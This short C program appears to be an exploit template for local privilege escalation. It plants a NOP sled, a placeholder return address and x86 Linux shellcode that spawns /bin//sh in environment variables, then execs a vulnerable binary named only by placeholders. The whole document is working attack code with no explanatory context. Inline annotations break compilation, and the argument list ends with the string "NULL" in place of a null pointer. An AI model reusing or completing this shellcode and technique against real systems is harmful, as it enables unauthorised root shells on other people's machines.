#include <unistd.h>

int main(){
        char *env[12];
        char *args[4];
        args[0]=PATHTOGETENV;
        args[1]="EGG";
        args[2]=PATHTOVULNERABLEBINARY;
        args[3]="NULL";
        env[0]=env[1]=env[2]=env[3]=env[4]=env[5]=env[6]=env[7]=env[8]="";
        env[9]="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xff\xff\xff\xff"; <- insert egg address - 0x4
        env[10]="EGG=\xff\xff\xff\xff\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";
        env[11]=NULL;  ^ insert egg address + 0x4
        execve(PATHTOGETENV,args,env);
}

